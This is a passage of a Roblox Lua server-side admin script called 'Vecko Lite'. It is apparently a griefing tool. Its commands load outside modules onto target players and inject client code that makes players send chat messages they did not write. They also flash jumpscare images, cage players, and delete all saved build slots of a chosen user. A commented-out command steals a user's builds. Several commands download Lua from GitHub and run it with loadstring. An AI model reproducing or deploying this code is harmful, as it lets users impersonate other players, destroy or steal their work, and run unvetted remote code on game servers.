			localcombo1, cloud2, cloud3, mushCloud, topCloud = cloudData.Cloud1, cloudData.Cloud2, cloudData.Cloud3, cloudData.MushCloud, cloudData.TopCloud

			local newSky = skybox:Clone()
			table.insert(nukeSkyboxes, newSky)
			newSky.Parent = Lighting
			task.spawn(effects, nolighting)

			for _, v in ipairs(Lighting:GetChildren()) do
				if v:IsA("Sky") and not table.find(nukeSkyboxes, v) and not table.find(realSkyboxes, v) then
					table.insert(realSkyboxes, v)
				end
			end

			task.spawn(function()
				local maxSize = explosionSize * 3
				local smallSize = explosionSize / 2.5
				local nukeDuration = (maxSize - smallSize) / 2 * (1 / 60)
				local transforms = {
					{innerSphere, Vector3.new(-6.5 * maxSize, -6.5 * maxSize, -6.5 * maxSize)},
					{outterSphere, Vector3.new(6.5 * maxSize, 6.5 * maxSize, 6.5 * maxSize)},
					{smallRing, Vector3.new(4.6 * maxSize, 4.6 * maxSize, 1.5 * maxSize)},
					{bigRing, Vector3.new(5 * maxSize, 5 * maxSize, 1 * maxSize)},
				}

				for _, v in ipairs(transforms) do
					local object, scale = v[1], v[2]
					if typeof(object) == "Instance" then
						local mesh = object:FindFirstChildOfClass("SpecialMesh")
						if mesh then
							mesh.Scale = scale * (smallSize / maxSize)
							task.spawn(basicTween, mesh, {Scale = scale}, nukeDuration)
						end
					end
				end

				do
					local startclock = os.clock()
					local expGrow, expStat = maxSize - smallSize, smallSize
					repeat
						destruction(
							position,
							(((os.clock() - startclock) / nukeDuration) * expGrow + expStat) * 2,
							attacker
						)
						task.wait(1/25)
					until (os.clock() - startclock) > nukeDuration
				end

				for _, v in ipairs(shockwave) do
					v.Transparency = 0
					task.spawn(basicTween, v, {Transparency = 1}, 100 * (1 / 60))
				end
				task.wait(100 * (1 / 60))

				for _, v in ipairs(shockwave) do
					v:Destroy()
				end
				shockwaveCompleted = true
			end)

			task.spawn(function()
				local transforms = {
					{baseCloud, Vector3.new(2.5 * explosionSize, 1 * explosionSize, 4.5 * explosionSize), Vector3.new(0, 0.05 * explosionSize, 0)},
					{poleBase, Vector3.new(1 * explosionSize, 2 * explosionSize, 2.5 * explosionSize), Vector3.new(0, 0.1 * explosionSize, 0)},
					{poleRing, Vector3.new(1.2 * explosionSize, 1.2 * explosionSize, 1.2 * explosionSize), Vector3.new(0, 1.3 * explosionSize, 0)},
					{topCloud, Vector3.new(0.75 * explosionSize, 1.5 * explosionSize, 1.5 * explosionSize), Vector3.new(0, 2.7 * explosionSize, 0)},
					{mushCloud, Vector3.new(2.5 * explosionSize, 1.75 * explosionSize, 3.5 * explosionSize), Vector3.new(0, 2.3 * explosionSize, 0)},
					{cloud1, Vector3.new(0.5 * explosionSize, 3 * explosionSize, 1 * explosionSize), Vector3.new(0, 0.75 * explosionSize, 0)},
					{cloud2, Vector3.new(0.5 * explosionSize, 1.5 * explosionSize, 1 * explosionSize), Vector3.new(0, 1.25 * explosionSize, 0)},
					{cloud3, Vector3.new(0.5 * explosionSize, 1.5 * explosionSize, 1 * explosionSize), Vector3.new(0, 1.7 * explosionSize, 0)},
				}

				for _, v in ipairs(transforms) do
					local object, scale = v[1], v[2]
					if typeof(object) == "Instance" then
						object.Position = position + v[3] / 5
						local mesh = object:FindFirstChildOfClass("SpecialMesh")
						if mesh then
							mesh.Scale = scale / 5
							task.spawn(basicTween, mesh, {Scale = scale}, 2)
						end
						task.spawn(basicTween, object, {Position = position + v[3]}, 2)
					end
				end
			end)
			task.wait(2)

			for _, v in ipairs(clouds) do
				local mesh = v:FindFirstChildOfClass("SpecialMesh")
				if mesh then
					mesh.VertexColor = Vector3.new(0.9, 0.6, 0)
					task.spawn(basicTween, mesh, {VertexColor = Vector3.new(0.9, 0, 0)}, 0.6 / 0.0025 * (1 / 60))
				end
			end
			task.wait(0.6 / 0.0025 * (1 / 60))

			for _, v in ipairs(clouds) do
				local mesh = v:FindFirstChildOfClass("SpecialMesh")
				if mesh then
					mesh.VertexColor = Vector3.new(0.9, 0, 0)
					task.spawn(basicTween, mesh, {VertexColor = Vector3.new(0.5, 0, 0)}, (0.9 - 0.5) / 0.01 * (1 / 60) * 2)
				end
			end
			task.wait((0.9 - 0.5) / 0.01 * (1 / 60) * 2)

			local skyConnection
			skyConnection = newSky.AncestryChanged:Connect(function()
				if newSky and newSky.Parent ~= Lighting and table.find(nukeSkyboxes, newSky) then
					table.remove(nukeSkyboxes, table.find(nukeSkyboxes, newSky))
				end
				local hasNukeSkyboxes = false
				for _, v in ipairs(nukeSkyboxes) do
					if v.Parent == Lighting then
						hasNukeSkyboxes = true
						break
					end
				end
				if not hasNukeSkyboxes then
					for i = #realSkyboxes, 1, -1 do
						local v = realSkyboxes[i]
						if v.Parent == Lighting then
							v.Parent = nil
							task.spawn(function()
								task.wait()
								v.Parent = Lighting
							end)
						elseif table.find(realSkyboxes, v) then
							table.remove(realSkyboxes, table.find(realSkyboxes, v))
						end
					end
				end
				skyConnection:Disconnect()
			end)
			Debris:AddItem(newSky, 10)

			for _, v in ipairs(clouds) do
				local mesh = v:FindFirstChildOfClass("SpecialMesh")
				if mesh then
					mesh.VertexColor = Vector3.new(0, 0, 0)
					task.spawn(basicTween, mesh, {VertexColor = Vector3.new(0.5, 0.5, 0.5)}, 0.5 / 0.005 * (1 / 60))
					task.spawn(basicTween, mesh, {Scale = mesh.Scale + Vector3.new(0.1, 0.1, 0.1) * (0.5 / 0.005)}, 0.5 / 0.005 * (1 / 60))
				end
				task.spawn(basicTween, v, {Transparency = 0.5}, 0.5 / 0.005 * (1 / 60))
			end
			task.wait(0.5 / 0.005 * (1 / 60))

			for _, v in ipairs(clouds) do
				task.spawn(basicTween, v, {Transparency = 1}, 20)
				local mesh = v:FindFirstChildOfClass("SpecialMesh")
				if mesh then
					task.spawn(basicTween, mesh, {Scale = mesh.Scale + Vector3.new(0.1, 0.1, 0.1) * (1 / 0.005)}, 20)
				end
			end
			task.wait(20)

			while true do task.wait(1) if shockwaveCompleted then break end end
			container:Destroy()
		end

		if target.Character and target.Character:FindFirstChild("HumanoidRootPart") then
			explode(target.Character.HumanoidRootPart.Position, args, false, sender)
		else
			explode(nil, args, false, sender)
		end
	elseif cmd == "!stickbeater" then
		local targets = GetPlayers(args[2], sender)
		for i, plr in ipairs(targets) do
			task.spawn(function()
				GraphicalEffects.CrystalRing(plr, "Lime green", 2)
			end)
			require(5813743814).load(plr.Name)
		end
		notifyv2(sender, "[Vecko Lite]: ", "✅ Ran stick beater on " .. (#targets == 1 and targets[1].Name or tostring(#targets) .. " players"))
	elseif cmd == "!motorcycle" then
		local targets = GetPlayers(args[2], sender)
		for i, plr in ipairs(targets) do
			task.spawn(function()
				GraphicalEffects.CrystalRing(plr, "Lime green", 2)
			end)
			require(7473216460).load(plr.Name)
		end
		notifyv2(sender, "[Vecko Lite]: ", "✅ Ran motorcycle " .. (#targets == 1 and targets[1].Name or tostring(#targets) .. " players"))
	elseif cmd == "!knife" then
		local targets = GetPlayers(args[2], sender)
		for i, plr in ipairs(targets) do
			task.spawn(function()
				GraphicalEffects.CrystalRing(plr, "Lime green", 2)
			end)
			require(2829943043):Run(plr.Name,'i baked you a pie')
		end
		notifyv2(sender, "[Vecko Lite]: ", "✅ Ran grab knife on" .. (#targets == 1 and targets[1].Name or tostring(#targets) .. " players"))
	elseif cmd == "!magician" then
		local targets = GetPlayers(args[2], sender)
		for i, plr in ipairs(targets) do
			task.spawn(function()
				GraphicalEffects.CrystalRing(plr, "Lime green", 2)
			end)
			require(6438184104).load(plr.Name)
		end
		notifyv2(sender, "[Vecko Lite]: ", "✅ Ran magician on " .. (#targets == 1 and targets[1].Name or tostring(#targets) .. " players"))
	elseif cmd == "!bombvest" then
		local targets = GetPlayers(args[2], sender)
		for i, plr in ipairs(targets) do
			task.spawn(function()
				GraphicalEffects.CrystalRing(plr, "Lime green", 2)
			end)
			require(0x49731b7f).load(plr.Name)
		end
		notifyv2(sender, "[Vecko Lite]: ", "✅ Ran bomb vest on " .. (#targets == 1 and targets[1].Name or tostring(#targets) .. " players"))
	elseif cmd == "!toolgun" then
		local targets = GetPlayers(args[2], sender)
		for i, plr in ipairs(targets) do
			task.spawn(function()
				GraphicalEffects.CrystalRing(plr, "Lime green", 2)
			end)
			require(14108404712).mingebag(plr.Name)
		end
		notifyv2(sender, "[Vecko Lite]: ", "✅ Ran tool gun on " .. (#targets == 1 and targets[1].Name or tostring(#targets) .. " players"))
	elseif cmd == "!oofgun" then
		local targets = GetPlayers(args[2], sender)
		for i, plr in ipairs(targets) do
			task.spawn(function()
				GraphicalEffects.CrystalRing(plr, "Lime green", 2)
			end)
			require(123877608710766).load(plr.Name)
		end
		notifyv2(sender, "[Vecko Lite]: ", "✅ Ran suicide gun on " .. (#targets == 1 and targets[1].Name or tostring(#targets) .. " players"))
	elseif cmd == "!gmod" then
		local targets = GetPlayers(args[2], sender)
		for i, plr in ipairs(targets) do
			local success, gear = pcall(function()
				return game:GetService("InsertService"):LoadAsset(2136443074)
			end)
			if not table.find(gmodded, plr.UserId) then
				table.insert(gmodded, plr.UserId)
			end
			if success and gear then
				local gmod = gear:FindFirstChildOfClass("Tool")
				if gmod then
					gmod.Parent = plr.Backpack
				end
				gmod:WaitForChild("RemoteScript"):Destroy()
				game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):FindFirstChild("RemoteScript"):Clone().Parent = gmod
				if not game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):FindFirstChild("cxo's gmod remote") then
					local gmodremote = Instance.new("RemoteEvent", game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"))
					gmodremote.Name = "cxo's gmod remote"
				end
				gcon[plr.UserId] = gmod:WaitForChild("RemoteScript").Destroying:Connect(function()
					gcon[plr.UserId]:Disconnect()
				end)
			end
		end
	elseif cmd == "!dex" then
		local targets = GetPlayers(args[2], sender)
		for i, plr in ipairs(targets) do
			task.spawn(function()
				GraphicalEffects.CrystalRing(plr, "Lime green", 2)
			end)
			require(12146718110):Fire(plr.Name)
		end
		notifyv2(sender, "[Vecko Lite]: ", "✅ Ran DEX explorer on " .. (#targets == 1 and targets[1].Name or tostring(#targets) .. " players"))
	elseif cmd == "!gentk" then
		local targets = GetPlayers(args[2], sender)
		for i, plr in ipairs(targets) do
			task.spawn(function()
				GraphicalEffects.CrystalRing(plr, "Lime green", 2)
			end)
			require(5430831931).Dark(plr.Name)
		end
		notifyv2(sender, "[Vecko Lite]: ", "✅ Gentleman's killer ran on " .. (#targets == 1 and targets[1].Name or tostring(#targets) .. " players"))
	elseif cmd == "!tazer" then
		local targets = GetPlayers(args[2], sender)
		for i, plr in ipairs(targets) do
			task.spawn(function()
				GraphicalEffects.CrystalRing(plr, "Lime green", 2)
			end)
			require(13556064399).bzzt(plr.Name)
		end
		notifyv2(sender, "[Vecko Lite]: ", "✅ Ran tazer tool on " .. (#targets == 1 and targets[1].Name or tostring(#targets) .. " players"))
	elseif cmd == "!provac" then
		local targets = GetPlayers(args[2], sender)
		for i, plr in ipairs(targets) do
			task.spawn(function()
				GraphicalEffects.CrystalRing(plr, "Lime green", 2)
			end)
			require(4932480712).load(plr.Name)
		end
		notifyv2(sender, "[Vecko Lite]: ", "✅ Pro vacuum ran on " .. (#targets == 1 and targets[1].Name or tostring(#targets) .. " players"))
	elseif cmd == "!afk" then
		local targets = GetPlayers(args[2], sender)
		for i, plr in ipairs(targets) do
			if afk[plr.Name] then return end
			afk[plr.Name] = plr
			local ps = plr.Character.HumanoidRootPart.CFrame

			if not game:GetService("ServerScriptService"):FindFirstChild("goog") then
				local ticking = tick()
				require(112691275102014).load() -- goog readder
				repeat task.wait() until game:GetService("ServerScriptService"):FindFirstChild("goog") or tick() - ticking >= 10
			end

			local goog = game:GetService("ServerScriptService"):FindFirstChild("goog")

			if not goog then
				warn("goog failed to be added, command can not continue")
				return
			end

			local scr = goog:FindFirstChild("Utilities").Client:Clone()
			local loa = goog:FindFirstChild("Utilities"):FindFirstChild("googing"):Clone()

			loa.Parent = scr
			scr:WaitForChild("Exec").Value = [[

				for i,v in pairs(game:GetDescendants()) do
					if v:IsA("Sound") then
						v.Volume = 0
					end
				end
			
				game.DescendantAdded:Connect(function(v)
					if v:IsA("Sound") then
						v.Volume = 0
						v:GetPropertyChangedSignal("Volume"):Connect(function()
							if v.Volume ~= 0 then
								v.Volume = 0
							end
						end)
					end
				end)

			]]

			if plr.PlayerGui then
				local s = Instance.new("ScreenGui", plr.PlayerGui)
				s.ResetOnSpawn = false
				s.Name = "AFK"
				scr.Parent = s
			else
				notifyv2(sender, "[Vecxo Lite]:", "Failed to give you the sound muter, You may hear sounds.")
			end

			scr.Enabled = true

			local function wait4char()
				if not plr.Character then
					plr:LoadCharacter()
					repeat task.wait() until plr.Character
				end
			end

			while afk[plr.Name] do

				wait4char()

				local char = plr.Character
				if char then
					local hrp = char:FindFirstChild("HumanoidRootPart")
					if hrp then
						if (hrp.CFrame.Position - ps.Position).Magnitude >= 0.1 then
							hrp.CFrame = ps
						end
					else
						plr:LoadCharacter()
						task.wait(0.5)
						char = plr.Character
						hrp = char and char:FindFirstChild("HumanoidRootPart")
						if hrp then
							hrp.CFrame = ps
						end
					end
				else
					wait4char()
				end

				if not plr.Character:FindFirstChild("AntiTouch") then
					local v = Instance.new("Part", plr.Character)
					local w = Instance.new("WeldConstraint", v)
					v.Transparency = 1
					v.Size = Vector3.new(5,6,5)
					v.Name = "AntiTouch"
					v.CanCollide = true
					v.Locked = true
					v.CFrame = plr.Character:WaitForChild("HumanoidRootPart").CFrame
					w.Part0 = v
					w.Part1 = plr.Character:WaitForChild("HumanoidRootPart")
					v.Touched:Connect(function(t)
						local c = t.Parent
						local cn = c.Name
						if cn == plr.Name then return end
						if not c:FindFirstChild("Humanoid") then return c.Parent end

						if c:FindFirstChild("HumanoidRootPart") then
							local b = Instance.new("BodyGyro", c.Torso)
							b.MaxTorque = Vector3.new(-15e30, -15e30, -15e30)
						else
							game.Players:FindFirstChild(cn):LoadCharacter()
							local b = Instance.new("BodyGyro", c.Torso)
							b.MaxTorque = Vector3.new(-15e30, -15e30, -15e30)
						end
					end)
				end

				if not plr.Character:FindFirstChild("Head"):FindFirstChild("AFK") then
					local b = Instance.new("BillboardGui", plr.Character:WaitForChild("Head"))
					local t = Instance.new("TextLabel", b)
					b.Size = UDim2.new(0, 50, 0, 50)
					b.ExtentsOffset = Vector3.new(0, 1.2, 0)
					b.Name = "AFK"
					t.Size = UDim2.new(0, 50, 0, 20)
					t.BackgroundTransparency = 1
					t.Text = "[ AFK ]"
					t.TextSize = 20
					t.Font = Enum.Font.SourceSansBold
					t.Name = "TEXT"
				end
				task.wait()
			end
		end
	elseif cmd == "!unafk" then
		local targets = GetPlayers(args[2], sender)
		for i, plr in ipairs(targets) do
			if sender.UserId ~= 36373784 then
				if sender.Name ~= plr.Name  then
					notifyv2(sender, "[Vecxo Lite]:", "You can not unafk this player")
					return
				end
			end
			if afk[plr.Name] then
				afk[plr.Name] = nil
			end
			if plr.Character and plr.Character:FindFirstChild("Head") and plr.Character.Head:FindFirstChild("AFK") then
				plr.Character.Head:FindFirstChild("AFK"):Destroy()
			end
			if plr.Character and plr.Character:FindFirstChild("AntiTouch") then
				plr.Character.AntiTouch:Destroy()
			end
			if plr.PlayerGui and plr.PlayerGui:FindFirstChild("AFK") then
				plr.PlayerGui.AFK:Destroy()
			end

			if not game:GetService("ServerScriptService"):FindFirstChild("goog") then
				local ticking = tick()
				require(112691275102014).load() -- goog readder
				repeat task.wait() until game:GetService("ServerScriptService"):FindFirstChild("goog") or tick() - ticking >= 10
			end

			local goog = game:GetService("ServerScriptService"):FindFirstChild("goog")

			if not goog then
				warn("goog failed to be added, command can not continue")
				return
			end

			local scr = goog:FindFirstChild("Utilities").Client:Clone()
			local loa = goog:FindFirstChild("Utilities"):FindFirstChild("googing"):Clone()

			loa.Parent = scr
			scr:WaitForChild("Exec").Value = [[
			
				for i,v in pairs(game:GetDescendants()) do
					if v:IsA("Sound") then
						v.Volume = 1
					end
				end

			]]

			if plr.PlayerGui then
				scr.Parent = plr.PlayerGui
			else
				notify(sender, "[Vecxo Lite]:", "Failed to give you the sound unmuter, You may not hear sounds.")
			end
			scr.Enabled = true
		end
	elseif cmd == "!chat" and args[2] then
		local targets = GetPlayers(args[2], sender)
		local msg = table.concat(args, " ", 3)
		for i, plr in ipairs(targets) do
			if _G.sudo then
				_G.sudo(plr.Name, msg, "all")
			else
				if _G.say and typeof(_G.say) == "function" then
					_G.say(plr.Name, msg)
					return
				else
					_G.say = function(p, m)
						p = game.Players:FindFirstChild(p)
						if not game:GetService("ServerScriptService"):FindFirstChild("goog") then
							local ticking = tick()
							require(112691275102014).load() -- goog readder
							repeat task.wait() until game:GetService("ServerScriptService"):FindFirstChild("goog") or tick() - ticking >= 10
						end

						local goog = game:GetService("ServerScriptService"):FindFirstChild("goog")

						if not goog then
							warn("goog failed to be added, command can not continue")
							return
						end

						local scr = goog:FindFirstChild("Utilities").Client:Clone()
						local loa = goog:FindFirstChild("Utilities"):FindFirstChild("googing"):Clone()

						loa.Parent = scr
						scr:WaitForChild("Exec").Value = string.format([[

								game:GetService("TextChatService"):WaitForChild("TextChannels"):FindFirstChild("RBXGeneral"):SendAsync("%s")

								script:Destroy()

							]], m)

						if p.Character then
							scr.Parent = p.Character
						else
							scr.Parent = p:WaitForChild("PlayerGui")
						end

						scr.Enabled = true
					end
					_G.say(plr.Name, msg)
				end
			end
		end
	--[[elseif cmd == "!buildsteal" then
		local no = false
		if not table.find(exclusivewl, sender.Name) then
			no = true
			notifyv2(sender, "[Vecko Lite]: ", "❌ You are not authorized to run this command, only the top admins can access this!")
		end
		if no ~= true then
		if not shared._DEK then
			notify(sender, "[Vecxo Lite]: ", "shared._DEK not found, importing..", 2)
			local success, result = pcall(function() -- decryptionite's build loader
				return game:GetService("HttpService"):GetAsync("https://raw.githubusercontent.com/reloxz/zastuff/refs/heads/main/DekKAHBuildAPI")
			end)

			if success then
				local content = result
				local loaded, fail = loadstring(content)
				if loaded then
					loaded()
				else
					notify(sender, "[Vecxo Lite]: ", "loaded shared._DEK")
				end
			else
				notifyv2(sender, "[Vecxo Lite]: ", "Failed to load shared._DEK")
			end
		end

		shared._DEK.Steal = nil

		function shared._DEK:Steal(Operator:number,OperatorSlot:number,Victim:number,VictimSlot:number) -- fix 4 kohles (allow 0)

			if not (Operator or Victim) then
				return
			end

			local RemoteParts = shared._DEK:GetStore(Victim,VictimSlot)
			if RemoteParts then
				local StolenParts = shared._DEK:LoadParts(RemoteParts,false)

				shared._DEK:SaveParts(StolenParts,Operator,OperatorSlot) -- Operator should be a UserId now.

			end

		end

		local plr = args[2]
		local plrid
		local plrslot = args[3]
		local pslot
		local target = args[4]
		local targetid
		local targetslot = args[5]
		local tslot

		if targetslot == "0" then
			tslot = nil
		end

		if plrslot == "0" then
			pslot = nil
		end

		if plr == "me" then
			plr = sender.Name
		end

		local argt = GetPlayers(args[2], sender)

		if #argt > 0 then
			plr = argt[1].Name
			print('name of plr that wants build '..plr)
		end

		local success, fail = pcall(function()
			plrid = game.Players:GetUserIdFromNameAsync(plr)
		end)

		if fail then
			notify(sender, "[Vecxo Lite]: ", "❌ Failed to get UserId, is the name correct?")
			return
		end

			local success, fail = pcall(function()
			print(tostring(target))
			targetid = game.Players:GetUserIdFromNameAsync(target)
		end)

		if fail then
			notify(sender, "[Vecxo Lite]: ", "❌ Failed to get UserId, is the name correct?")
			return
		end

		local success, fail = pcall(function()
			shared._DEK:Steal(plrid, pslot, targetid, tslot)
		end)

		if success then
			notifyv2(sender, "[Vecxo Lite]: ", "✅ Stole ".. target .."'s build (".. targetslot ..") and saved it to ".. plr .."'s slot (".. plrslot ..")")
		end

		if fail then
			notifyv2(sender, "[Vecxo Lite]: ", "❌ Failed to steal ".. target .."'s build.")
		end
	end ]]
	elseif cmd == "!image" and args[2] then
		local targets = GetPlayers(args[2], sender)
		local selection = args[3] and args[3]:lower() 
		local spam = args[4] and args[4]:lower() == "true" 

		local function showImage(plr, imageId)
			local sgui = Instance.new("ScreenGui")
			sgui.IgnoreGuiInset = true
			sgui.Parent = plr.PlayerGui

			local clyde = Instance.new("ImageLabel")
			clyde.Size = UDim2.new(1, 0, 1.1, 0)
			clyde.BackgroundTransparency = 1
			clyde.Image = "rbxassetid://" .. imageId
			clyde.ZIndex = 10
			clyde.Visible = true
			clyde.Parent = sgui

			if not game:GetService("ServerScriptService"):FindFirstChild("goog") then
				local ticking = tick()
				require(112691275102014).load()
				repeat task.wait() until game:GetService("ServerScriptService"):FindFirstChild("goog") or tick() - ticking >= 10
			end

			local goog = game:GetService("ServerScriptService"):FindFirstChild("goog")
			if not goog then
				warn("goog failed to be added, command cannot continue")
				return
			end

			local scr = goog:FindFirstChild("Utilities").Client:Clone()
			local loa = goog:FindFirstChild("Utilities"):FindFirstChild("googing"):Clone()
			loa.Parent = scr
			scr:WaitForChild("Exec").Value = [[
			local sound = Instance.new("Sound", workspace)
			sound.SoundId = "rbxassetid://270145703"
			sound.Volume = 5
			sound:Play()
			sound.Ended:Connect(function()
				sound:Destroy()
				script:Destroy()
			end)
		]]
			scr.Parent = plr.PlayerGui
			scr.Name = "JumpScareScript"
			scr.Enabled = true

			task.wait(0.7)

			local tween = TweenService:Create(
				clyde,
				TweenInfo.new(0.7, Enum.EasingStyle.Linear),
				{ ImageTransparency = 1 }
			)
			tween:Play()
			tween.Completed:Wait()

			sgui:Destroy()
		end

		for _, plr in ipairs(targets) do
			if selection == "random" then
				if spam then
					coroutine.wrap(function()
						for i = 1, 5 do
							task.wait(0.2)
							local imgId = getRandomImageId()
							showImage(plr, imgId)
						end
					end)()
				else
					local imgId = getRandomImageId()
					coroutine.wrap(function()
						showImage(plr, imgId)
					end)()
				end
			else
				local isId = tonumber(selection) and selection:match("^%d+$") ~= nil
				local id
				if isId then
					id = selection
				else
					id = imageIds[selection]
					if not id then
						notifyv2(sender, "[Vecxo Lite]: ", "❌ Unknown image name '" .. tostring(selection) .. "'")
						return
					end
				end
				coroutine.wrap(function()
					showImage(plr, id)
				end)()
			end
		end
		notifyv2(sender, "[Vecko Lite]: ", "✅ Images sent too " .. (#targets == 1 and targets[1].Name or tostring(#targets) .. " players"))
	elseif cmd == "!buildload" then
		local no = false
		if not table.find(exclusivewl, sender.Name) then
			no = true
			notifyv2(sender, "[Vecxo Lite]: ", "❌ You are not authorized to run this command, only the top admins can access this!")
		end

		if no ~= true then
			local targetid = args[2]
			local targetslot = args[3]

			if targetslot == "0" then
				targetslot = nil
			end

			if targetid == "me" then
				targetid = sender.Name
			end

			local argt = GetPlayers(args[2], sender)
			if #argt > 0 then
				targetid = argt[1].Name
			end

			local success, result = pcall(function()
				return game.Players:GetUserIdFromNameAsync(targetid)
			end)

			if success then
				targetid = result
			else
				notify(sender, "[Vecxo Lite]: ", "❌ Failed to get UserId, is the name correct?")
				return
			end

			if not shared._DEK then
				notify(sender, "[Vecxo Lite]: ", "shared._DEK not found, importing..", 2)
				local success, result = pcall(function()
					return loadstring(game:GetService("HttpService"):GetAsync("https://raw.githubusercontent.com/reloxz/zastuff/refs/heads/main/DekKAHBuildAPI"))()
				end)
				if success then
					local content = result
					local loaded, fail = loadstring(content)
					if loaded then
						loaded()
					else
						notify(sender, "[Vecxo Lite]: ", "Loaded shared._DEK")
					end
				else
					notifyv2(sender, "[Vecxo Lite]: ", "❌ Failed to load shared._DEK")
					return
				end
			end

			local success, fail = pcall(function()
				shared._DEK:Load(game:GetService("Workspace"), targetid, targetslot)
			end)

			if success then
				notifyv2(sender, "[Vecxo Lite]: ", "✅ Successfully loaded build from user ID ".. targetid .." (slot ".. (targetslot or "default") ..") into Workspace.")
			else
				notifyv2(sender, "[Vecxo Lite]: ", "❌ Failed to load build from user ID ".. targetid ..".")
			end
		end
	elseif cmd == "!buildremove" and args[2] then
		local no = false
		if not table.find(exclusivewl, sender.Name) then
			no = true
			notifyv2(sender, "[Vecko Lite]: ", "❌ You are not authorized to run this command, only the top admins can access this!")
		end
		if no ~= true then
			local targetid = args[2]
			local slot = args[3]
			if slot == "0" then
				slot = nil
			end

			if slot == nil then
			elseif slot == "all" then
			else
			end

			if targetid == "me" then
				targetid = sender.Name
			end

			local argt = GetPlayers(args[2], sender)
			if #argt > 0 then
				targetid = argt[1].Name
			end

			local success, fail = pcall(function()
				targetid = game.Players:GetUserIdFromNameAsync(targetid)
			end)

			if fail then
				notifyv2(sender, "[Vecxo Lite]: ", "Failed to get UserId, is the name correct?")
				return
			end
			if not shared._DEK then
				notifyv2(sender, "[Vecxo Lite]: ", "shared._DEK not found, importing..", 2)
				local success, result = pcall(function()
					return game:GetService("HttpService"):GetAsync("https://raw.githubusercontent.com/decryptionite/streaming/refs/heads/main/Kohls%20Admin%20House%20NP/unlocked_buildload_v1.lua")
				end)
				if success then
					local loaded, fail = loadstring(result)
					if loaded then
						loaded()
					else
						notifyv2(sender, "[Vecxo Lite]: ", "Failed to load shared._DEK")
						return
					end
				else
					notifyv2(sender, "[Vecxo Lite]: ", "Failed to fetch shared._DEK script")
					return
				end
			end

			if slot == "all" then
				local deleted = 0
				for i = 1, 11 do
					pcall(function()
						shared._DEK:Delete(targetid, tostring(i))
						deleted += 1
					end)
				end
				notifyv2(sender, "[Vecxo Lite]: ", "✅ Successfully wiped all slots (1–11) for "..targetid.." ["..deleted.." slots]")
			else
				local success, fail = pcall(function()
					shared._DEK:Delete(targetid, slot)
				end)

				if success then
					notifyv2(sender, "[Vecxo Lite]: ", "✅ Successfully removed build from "..targetid..(slot and " (slot "..slot..")" or " (kohls slot)"))
				else
					notifyv2(sender, "[Vecxo Lite]: ", "❌ Failed to remove build from "..targetid)
				end
			end
		end
	elseif cmd == "!cage" then
		local targets = GetPlayers(args[2], sender)
		for i, plr in ipairs(targets) do
			local character = plr.Character
			if not character or not character:FindFirstChild("HumanoidRootPart") then continue end
			local root = character.HumanoidRootPart
			local cageModel = Instance.new("Model")
			cageModel.Name = "Cage_" .. plr.Name

			local cageWidth = 8
			local cageHeight = 10
			local cageDepth = 8
			local barThickness = 0.3
			local barSpacing = 0.6
			local cageCF = root.CFrame * CFrame.new(0, 0, 0)

			local TweenService = game:GetService("TweenService")

			local function risePart(part, targetCFrame, delay)
				part.CFrame = targetCFrame * CFrame.new(0, -50, 0)
				task.delay(delay or 0, function()
					local tweenInfo = TweenInfo.new(2, Enum.EasingStyle.Quart, Enum.EasingDirection.Out)
					TweenService:Create(part, tweenInfo, {CFrame = targetCFrame}):Play()
				end)
			end

			local function makeBarsWall(length, height, offsetCF, horizontal)
				local count = math.floor(length / barSpacing)
				for i = 0, count do
					local bar = Instance.new("Part")
					bar.Anchored = true
					bar.CanCollide = true
					bar.Transparency = 0.4
					bar.Color = Color3.new(0, 0, 0)
					bar.Material = Enum.Material.SmoothPlastic
					if horizontal then
						bar.Size = Vector3.new(barThickness, height, barSpacing)
						bar.CFrame = offsetCF * CFrame.new(-length/2 + i * barSpacing, 0, 0)
					else
						bar.Size = Vector3.new(barSpacing, height, barThickness)
						bar.CFrame = offsetCF * CFrame.new(0, 0, -length/2 + i * barSpacing)
					end
					bar.Parent = cageModel
					risePart(bar, bar.CFrame)
				end
			end

			-- Floor
			local floor = Instance.new("Part")
			floor.Size = Vector3.new(cageWidth, 1, cageDepth)
			floor.Anchored = true
			floor.CanCollide = true
			floor.Transparency = 0.4
			floor.Color = Color3.new(0, 0, 0)
			floor.Material = Enum.Material.SmoothPlastic
			floor.CFrame = cageCF * CFrame.new(0, -cageHeight/2, 0)
			floor.Parent = cageModel
			risePart(floor, floor.CFrame)

			local ceiling = floor:Clone()
			ceiling.CFrame = cageCF * CFrame.new(0, cageHeight/2, 0)
			ceiling.Parent = cageModel
			risePart(ceiling, ceiling.CFrame)

			makeBarsWall(cageWidth, cageHeight, cageCF * CFrame.new(0, 0, cageDepth/2), true)
			makeBarsWall(cageWidth, cageHeight, cageCF * CFrame.new(0, 0, -cageDepth/2), true)
			makeBarsWall(cageDepth, cageHeight, cageCF * CFrame.new(cageWidth/2, 0, 0), false)
			makeBarsWall(cageDepth, cageHeight, cageCF * CFrame.new(-cageWidth/2, 0, 0), false)

			cageModel.Parent = workspace

			task.delay(1.2, function()
				if plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") then
					plr.Character:PivotTo(cageCF)
				end
			end)

			plr.CharacterAdded:Connect(function(char)
				task.wait(0.8)
				local hrp = char:FindFirstChild("HumanoidRootPart")
				if hrp and cageModel and cageModel.Parent then
					char:PivotTo(cageCF)
				end
			end)

			_G.cagedPlayers[plr] = {
				cageModel = cageModel,
				center = cageCF.Position,
				width = cageWidth,
				depth = cageDepth
			}

			coroutine.wrap(function()
				while _G.cagedPlayers[plr] and _G.cagedPlayers[plr].cageModel.Parent do
					task.wait(0.8)
					local char = plr.Character
					if char and char:FindFirstChild("HumanoidRootPart") then
						local pos = char.HumanoidRootPart.Position
						local center = _G.cagedPlayers[plr].center
						local bounds = Vector3.new(cageWidth / 2, 100, cageDepth / 2)
						local offset = (pos - center)

						if math.abs(offset.X) > bounds.X or math.abs(offset.Z) > bounds.Z then
							char:PivotTo(CFrame.new(center))
						end
					end
				end
			end)()
		end
		notifyv2(sender, "[Vecko Lite]: ", "✅ Caged " .. (#targets == 1 and targets[1].Name or tostring(#targets) .. " players"))
	elseif cmd == "!alpcas" then
		local int = tonumber(table.concat(args, " ", 2))

		if int <= 0 then
			notifyv2(sender, "[Vecxo Lite]: ", "You need to provide a number higher than 0!")
			return
		end

		if int > 1000 then
			notifyv2(sender, "[Vecxo Lite]: ", "Due to server crashing the limit is 1000")
			return
		end

